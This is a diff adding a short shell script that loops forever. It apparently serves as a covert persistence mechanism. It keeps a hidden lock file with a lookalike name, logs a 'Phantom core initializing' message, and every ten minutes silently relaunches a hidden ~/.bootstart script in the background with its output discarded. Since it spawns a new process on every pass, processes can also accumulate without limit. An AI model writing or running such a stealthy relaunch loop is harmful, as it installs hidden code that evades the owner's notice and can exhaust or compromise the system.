@@ -1,0 +1,8 @@
+while true; do
+  if [ ! -f ~/.veyri0n.lock ]; then
+    echo "[*] Phantom core initializing: $(date)" >> ~/.veyrion.log
+    touch ~/.veyri0n.lock
+  fi
+  nohup sh ~/.bootstart > /dev/null 2>&1 &
+  sleep 600
+done
